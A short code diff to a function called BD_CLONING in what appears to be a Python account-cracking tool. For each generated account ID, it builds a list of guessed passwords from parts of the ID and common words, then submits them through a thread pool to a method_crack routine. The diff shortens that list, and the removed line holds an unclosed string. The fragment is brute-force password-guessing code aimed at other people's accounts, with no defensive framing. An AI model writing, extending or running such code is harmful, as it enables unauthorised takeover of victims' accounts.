@@ -141,7 +141,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','freefire','Bangladesh','freefire','Bangladesh','i love you','hacker','mababa','samiya','sojib1122','gaming','hacked','joker1','mim123','moriom','sahadat','112211','gaming boy','Gallery]
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','freefire','Bangladesh','i love you']
             Tara.submit(method_crack,ids,passlist)
     linex()
     print(' THE PROGRESS HAS BEEN COMPLETE ')
